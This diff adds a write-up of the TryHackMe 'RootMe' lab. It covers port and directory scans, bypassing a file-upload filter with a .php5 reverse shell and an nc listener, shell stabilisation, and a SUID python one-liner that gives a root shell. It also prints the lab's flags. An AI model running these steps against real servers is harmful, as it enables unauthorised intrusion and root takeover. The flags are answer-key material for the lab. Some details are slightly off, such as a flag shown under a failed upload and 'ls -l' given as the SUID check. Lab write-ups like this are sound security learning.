@@ -1,0 +1,143 @@
+ROOTME
+
+
+
+
+SCANNING: PORTS AND SERVICES.
+Quick scan to find open ports:
+nmap -T4 10.10.97.208
+OUTPUT:
+Nmap scan report for 10.10.97.208
+Host is up (0.046s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+Scan to check apache version:
+nmap -sV -p80 10.10.97.208
+OUTPUT:
+Nmap scan report for 10.10.97.208
+Host is up (0.039s latency).
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+
+Check service on port 22:
+nmap -sV -p22 10.10.97.208
+OUTPUT:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+SCANNING: DIRECTORIES.
+Since gobuster is explicitly required:
+gobuster dir -u http://10.10.97.208:80/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+OUTPUT:
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.97.208/uploads/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.97.208/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.97.208/js/]
+/panel                (Status: 301) [Size: 312] [--> http://10.10.97.208/panel/]
+
+
+
+
+(FAILED) EXPLOITATION: PLANNING.
+Navigating to 10.10.97:208/panel. File upload option.
+
+
+
+(FAILED) EXPLOITATION: EXECUTION.
+Download php reverse shell from:
+https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+Note:
+Edit php-reverse-shell.php and change CHANGE THIS commented field to my thm ip.
+Listener setup:
+nc -lnvp 1234
+Uploading script:
+Choose upload file and do so on the site.
+ERROR. OUTPUT:
+PHP não é permitido!
+THM{y0u_g0t_a_sh3ll}
+
+
+
+
+(FAILED) EXPLOITATION 2: PLANNING.
+We'll try to stick our php to a jpg.
+
+
+(FAILED) EXPLOITATION 2: EXECUTION.
+Add image to jpg:
+cat totally_normal_image.jpg revphp.php > shell.jpg
+Note:
+nc failed to catch a shell, even though upload seems successful.
+
+
+
+
+EXPLOITATION 3: RECON.
+Curl to check if server supports php:
+curl -I http://10.10.39.243:80
+OUTPUT:
+HTTP/1.1 200 OK
+Date: Sun, 13 Jul 2025 07:07:53 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Set-Cookie: PHPSESSID=s47ktbgbv29k5454078kmg8f70; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+
+
+EXPLOITATION 3: EXECUTION.
+Note:
+Previous attempt worked. I just missed some steps. 
+Trying again, we will use a .php file with .php5 extension, which seems to bypass upload filters.
+
+Listener on attacker:
+nc -lvnp 1234
+
+Note: 
+With gobuster, we found the /uploads directory. We visit said link and click the .php5 shell to start the shell.
+
+Stabilize shell:
+python -c 'import pty; pty.spawn("/bin/bash")'
+CTRL + Z
+stty raw -echo
+fg
+export TERM=xterm
+
+Find flag:
+find . -name "user.txt" 2>/dev/null
+OUTPUT:
+./var/www/user.txt
+
+Cat flag:
+cat ./var/www/user.txt
+OUTPUT:
+THM{y0u_g0t_a_sh3ll}
+
+
+
+
+PRIVESC: RECON.
+As requested, check SUID (Set User ID) permissions on files:
+ls -l
+INTERESTING OUTPUT:
+/usr/bin/python
+
+
+PRIVESC: EXECUTION.
+We simply run python and execute a root shel directly:
+/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+Flag:
+cat root/root.txt
+OUTPUT:
+THM{pr1v1l3g3_3sc4l4t10n}
+
+
